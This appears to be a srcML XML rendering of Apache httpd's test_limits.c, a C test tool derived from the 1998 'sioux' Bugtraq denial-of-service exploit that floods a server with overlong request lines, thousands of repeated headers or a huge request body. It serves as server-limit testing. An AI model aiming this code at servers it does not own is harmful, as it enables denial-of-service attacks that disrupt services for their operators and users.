<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<unit xmlns="http://www.sdml.info/srcML/src" xmlns:cpp="http://www.sdml.info/srcML/cpp" language="C" filename="projects/httpd-2.4.29/test/test_limits.c"><comment type="block">/**************************************************************
 * test_limits.c
 *
 * A simple program for sending abusive requests to a server, based
 * on the sioux.c exploit code that this nimrod posted (see below).
 * Roy added options for testing long header fieldsize (-t h), long
 * request-lines (-t r), and a long request body (-t b).
 *
 * FreeBSD 2.2.x, FreeBSD 3.0, IRIX 5.3, IRIX 6.2:
 *   gcc -o test_limits test_limits.c
 *
 * Solaris 2.5.1:
 *   gcc -o test_limits test_limits.c -lsocket -lnsl
 *
 *
 * Message-ID: &lt;861zqspvtw.fsf@niobe.ewox.org&gt;
 * Date: Fri, 7 Aug 1998 19:04:27 +0200
 * Sender: Bugtraq List &lt;BUGTRAQ@netspace.org&gt;
 * From: Dag-Erling Coidan =?ISO-8859-1?Q?Sm=F8rgrav?= &lt;finrod@EWOX.ORG&gt;
 * Subject:      YA Apache DoS attack
 *
 * Copyright (c) 1998 Dag-Erling Codan Smrgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer
 *    in this position and unchanged.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software withough specific prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */</comment>

<comment type="block">/*
 * Kudos to Mark Huizer who originally suggested this on freebsd-current
 */</comment>

<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;sys/types.h&gt;</cpp:file></cpp:include>
<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;sys/uio.h&gt;</cpp:file></cpp:include>

<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;sys/socket.h&gt;</cpp:file></cpp:include>
<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;netinet/in.h&gt;</cpp:file></cpp:include>

<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;netdb.h&gt;</cpp:file></cpp:include>
<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;stdio.h&gt;</cpp:file></cpp:include>
<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;stdlib.h&gt;</cpp:file></cpp:include>
<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;string.h&gt;</cpp:file></cpp:include>
<cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;unistd.h&gt;</cpp:file></cpp:include>

<cpp:define>#<cpp:directive>define</cpp:directive> <cpp:macro><name>TEST_LONG_REQUEST_LINE</name></cpp:macro>      <cpp:value>1</cpp:value></cpp:define>
<cpp:define>#<cpp:directive>define</cpp:directive> <cpp:macro><name>TEST_LONG_REQUEST_FIELDS</name></cpp:macro>    <cpp:value>2</cpp:value></cpp:define>
<cpp:define>#<cpp:directive>define</cpp:directive> <cpp:macro><name>TEST_LONG_REQUEST_FIELDSIZE</name></cpp:macro> <cpp:value>3</cpp:value></cpp:define>
<cpp:define>#<cpp:directive>define</cpp:directive> <cpp:macro><name>TEST_LONG_REQUEST_BODY</name></cpp:macro>      <cpp:value>4</cpp:value></cpp:define>

<function><type><name>void</name></type>
<name>usage</name><parameter_list>(<param><decl><type><name>void</name></type></decl></param>)</parameter_list>
<block>{
    <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>stderr</name></expr></argument>,
      <argument><expr>"usage: test_limits [-t (r|n|h|b)] [-a address] [-p port] [-n num]\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>1</expr></argument>)</argument_list></call></expr>;</expr_stmt>
}</block></function>

<function><type><name>int</name></type>
<name>main</name><parameter_list>(<param><decl><type><name>int</name></type> <name>argc</name></decl></param>, <param><decl><type><name>char</name> *</type><name><name>argv</name><index>[]</index></name></decl></param>)</parameter_list>
<block>{
    <decl_stmt><decl><type>struct <name>sockaddr_in</name></type> <name>sin</name></decl>;</decl_stmt>
    <decl_stmt><decl><type>struct <name>hostent</name> *</type><name>he</name></decl>;</decl_stmt>
    <decl_stmt><decl><type><name>FILE</name> *</type><name>f</name></decl>;</decl_stmt>
    <decl_stmt><decl><type><name>int</name></type> <name>o</name></decl>, <decl><type ref="prev"/><name>sd</name></decl>;</decl_stmt>

    <comment type="block">/* default parameters */</comment>
    <decl_stmt><decl><type><name>char</name> *</type><name>addr</name> <init>= <expr>"localhost"</expr></init></decl>;</decl_stmt>
    <decl_stmt><decl><type><name>int</name></type> <name>port</name> <init>= <expr>80</expr></init></decl>;</decl_stmt>
    <decl_stmt><decl><type><name>int</name></type> <name>num</name> <init>= <expr>1000</expr></init></decl>;</decl_stmt>
    <decl_stmt><decl><type><name>int</name></type> <name>testtype</name> <init>= <expr><name>TEST_LONG_REQUEST_FIELDS</name></expr></init></decl>;</decl_stmt>

    <comment type="block">/* get options */</comment>
    <while>while <condition>(<expr>(<name>o</name> = <call><name>getopt</name><argument_list>(<argument><expr><name>argc</name></expr></argument>, <argument><expr><name>argv</name></expr></argument>, <argument><expr>"t:a:p:n:"</expr></argument>)</argument_list></call>) != <name>EOF</name></expr>)</condition>
        <switch>switch <condition>(<expr><name>o</name></expr>)</condition> <block>{
        <case>case <expr>'t'</expr>:
            <if>if <condition>(<expr>*<name>optarg</name> == 'r'</expr>)</condition><then>
                <expr_stmt><expr><name>testtype</name> = <name>TEST_LONG_REQUEST_LINE</name></expr>;</expr_stmt></then>
            <else>else <if>if <condition>(<expr>*<name>optarg</name> == 'n'</expr>)</condition><then>
                <expr_stmt><expr><name>testtype</name> = <name>TEST_LONG_REQUEST_FIELDS</name></expr>;</expr_stmt></then>
            <else>else <if>if <condition>(<expr>*<name>optarg</name> == 'h'</expr>)</condition><then>
                <expr_stmt><expr><name>testtype</name> = <name>TEST_LONG_REQUEST_FIELDSIZE</name></expr>;</expr_stmt></then>
            <else>else <if>if <condition>(<expr>*<name>optarg</name> == 'b'</expr>)</condition><then>
                <expr_stmt><expr><name>testtype</name> = <name>TEST_LONG_REQUEST_BODY</name></expr>;</expr_stmt></then></if></else></if></else></if></else></if>
            <break>break;</break>
        </case><case>case <expr>'a'</expr>:
            <expr_stmt><expr><name>addr</name> = <name>optarg</name></expr>;</expr_stmt>
            <break>break;</break>
        </case><case>case <expr>'p'</expr>:
            <expr_stmt><expr><name>port</name> = <call><name>atoi</name><argument_list>(<argument><expr><name>optarg</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>
            <break>break;</break>
        </case><case>case <expr>'n'</expr>:
            <expr_stmt><expr><name>num</name> = <call><name>atoi</name><argument_list>(<argument><expr><name>optarg</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>
            <break>break;</break>
        </case><default>default:
            <expr_stmt><expr><call><name>usage</name><argument_list>()</argument_list></call></expr>;</expr_stmt>
        </default>}</block></switch></while>

    <if>if <condition>(<expr><name>argc</name> != <name>optind</name></expr>)</condition><then>
        <expr_stmt><expr><call><name>usage</name><argument_list>()</argument_list></call></expr>;</expr_stmt></then></if>

    <comment type="block">/* connect */</comment>
    <if>if <condition>(<expr>(<name>he</name> = <call><name>gethostbyname</name><argument_list>(<argument><expr><name>addr</name></expr></argument>)</argument_list></call>) == <name>NULL</name></expr>)</condition><then> <block>{
        <expr_stmt><expr><call><name>perror</name><argument_list>(<argument><expr>"gethostbyname"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>1</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    }</block></then></if>
    <expr_stmt><expr><call><name>memset</name><argument_list>(<argument><expr>&amp;<name>sin</name></expr></argument>, <argument><expr><sizeof>sizeof<argument_list>(<argument><expr><name>sin</name></expr></argument>)</argument_list></sizeof></expr></argument>)</argument_list></call></expr>;</expr_stmt>
    <expr_stmt><expr><call><name>memcpy</name><argument_list>(<argument><expr>(<name>char</name> *)&amp;<name><name>sin</name>.<name>sin_addr</name></name></expr></argument>, <argument><expr><name><name>he</name>-&gt;<name>h_addr</name></name></expr></argument>, <argument><expr><name><name>he</name>-&gt;<name>h_length</name></name></expr></argument>)</argument_list></call></expr>;</expr_stmt>
    <expr_stmt><expr><name><name>sin</name>.<name>sin_family</name></name> = <name><name>he</name>-&gt;<name>h_addrtype</name></name></expr>;</expr_stmt>
    <expr_stmt><expr><name><name>sin</name>.<name>sin_port</name></name> = <call><name>htons</name><argument_list>(<argument><expr><name>port</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

    <if>if <condition>(<expr>(<name>sd</name> = <call><name>socket</name><argument_list>(<argument><expr><name><name>sin</name>.<name>sin_family</name></name></expr></argument>, <argument><expr><name>SOCK_STREAM</name></expr></argument>, <argument><expr><name>IPPROTO_TCP</name></expr></argument>)</argument_list></call>) == -1</expr>)</condition><then> <block>{
        <expr_stmt><expr><call><name>perror</name><argument_list>(<argument><expr>"socket"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>1</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    }</block></then></if>

    <if>if <condition>(<expr><call><name>connect</name><argument_list>(<argument><expr><name>sd</name></expr></argument>, <argument><expr>(struct <name>sockaddr</name> *)&amp;<name>sin</name></expr></argument>, <argument><expr><sizeof>sizeof<argument_list>(<argument><expr><name>sin</name></expr></argument>)</argument_list></sizeof></expr></argument>)</argument_list></call> == -1</expr>)</condition><then> <block>{
        <expr_stmt><expr><call><name>perror</name><argument_list>(<argument><expr>"connect"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>1</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    }</block></then></if>

    <if>if <condition>(<expr>(<name>f</name> = <call><name>fdopen</name><argument_list>(<argument><expr><name>sd</name></expr></argument>, <argument><expr>"r+"</expr></argument>)</argument_list></call>) == <name>NULL</name></expr>)</condition><then> <block>{
        <expr_stmt><expr><call><name>perror</name><argument_list>(<argument><expr>"fdopen"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>1</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    }</block></then></if>

    <comment type="block">/* attack! */</comment>
    <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>stderr</name></expr></argument>, <argument><expr>"Testing like a plague of locusts on %s\n"</expr></argument>, <argument><expr><name>addr</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

    <if>if <condition>(<expr><name>testtype</name> == <name>TEST_LONG_REQUEST_LINE</name></expr>)</condition><then> <block>{
        <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"GET "</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        <while>while <condition>(<expr><name>num</name>-- &amp;&amp; !<call><name>ferror</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>)</condition> <block>{
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"/123456789"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
            <expr_stmt><expr><call><name>fflush</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>
        }</block></while>
        <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>" HTTP/1.0\r\n\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    }</block></then>
    <else>else <block>{
        <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"GET /fred/foo HTTP/1.0\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>

        <if>if <condition>(<expr><name>testtype</name> == <name>TEST_LONG_REQUEST_FIELDSIZE</name></expr>)</condition><then> <block>{
            <while>while <condition>(<expr><name>num</name>-- &amp;&amp; !<call><name>ferror</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>)</condition> <block>{
                <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"User-Agent: sioux"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
                <expr_stmt><expr><call><name>fflush</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>
            }</block></while>
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        }</block></then>
        <else>else <if>if <condition>(<expr><name>testtype</name> == <name>TEST_LONG_REQUEST_FIELDS</name></expr>)</condition><then> <block>{
            <while>while <condition>(<expr><name>num</name>-- &amp;&amp; !<call><name>ferror</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>)</condition>
                <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"User-Agent: sioux\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt></while>
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        }</block></then>
        <else>else <if>if <condition>(<expr><name>testtype</name> == <name>TEST_LONG_REQUEST_BODY</name></expr>)</condition><then> <block>{
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"User-Agent: sioux\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"Content-Length: 33554433\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
            <while>while <condition>(<expr><name>num</name>-- &amp;&amp; !<call><name>ferror</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>)</condition>
                <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"User-Agent: sioux\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt></while>
        }</block></then>
        <else>else <block>{
            <expr_stmt><expr><call><name>fprintf</name><argument_list>(<argument><expr><name>f</name></expr></argument>, <argument><expr>"\r\n"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        }</block></else></if></else></if></else></if>
    }</block></else></if>
    <expr_stmt><expr><call><name>fflush</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

    <block>{
        <decl_stmt><decl><type><name>apr_ssize_t</name></type> <name>len</name></decl>;</decl_stmt>
        <decl_stmt><decl><type><name>char</name></type> <name><name>buff</name><index>[<expr>512</expr>]</index></name></decl>;</decl_stmt>

        <while>while <condition>(<expr>(<name>len</name> = <call><name>read</name><argument_list>(<argument><expr><name>sd</name></expr></argument>, <argument><expr><name>buff</name></expr></argument>, <argument><expr>512</expr></argument>)</argument_list></call>) &gt; 0</expr>)</condition>
            <expr_stmt><expr><name>len</name> = <call><name>write</name><argument_list>(<argument><expr>1</expr></argument>, <argument><expr><name>buff</name></expr></argument>, <argument><expr><name>len</name></expr></argument>)</argument_list></call></expr>;</expr_stmt></while>
    }</block>
    <if>if <condition>(<expr><call><name>ferror</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>)</condition><then> <block>{
        <expr_stmt><expr><call><name>perror</name><argument_list>(<argument><expr>"fprintf"</expr></argument>)</argument_list></call></expr>;</expr_stmt>
        <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>1</expr></argument>)</argument_list></call></expr>;</expr_stmt>
    }</block></then></if>

    <expr_stmt><expr><call><name>fclose</name><argument_list>(<argument><expr><name>f</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>
    <expr_stmt><expr><call><name>exit</name><argument_list>(<argument><expr>0</expr></argument>)</argument_list></call></expr>;</expr_stmt>
}</block></function>
</unit>
